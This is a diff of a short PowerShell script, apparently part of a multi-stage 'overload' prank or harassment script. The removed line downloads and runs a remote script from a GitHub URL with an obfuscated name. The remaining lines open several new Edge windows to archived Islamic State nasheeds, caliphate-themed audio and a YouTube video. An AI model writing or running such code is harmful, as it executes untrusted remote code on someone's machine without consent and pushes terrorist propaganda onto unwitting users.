@@ -1,4 +1,3 @@
-IEX(IWR https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/overloadpart2.ps1 -UseBasicParsing)
 Start-Process -FilePath msedge -ArgumentList '--new-window https://ia600503.us.archive.org/20/items/IslamicStateNasheedMediaArchive/005-.mp3';
 Start-Process -FilePath msedge -ArgumentList '--new-window https://ia802502.us.archive.org/11/items/i-sacrifice-for-the-caliphate/Abu%20Yassir%20-%20Ummati%20Qad%20laha%20fajrun.mp3';
 Start-Process -FilePath msedge -ArgumentList '--new-window https://www.youtube.com/watch?v=8ybW48rKBME';
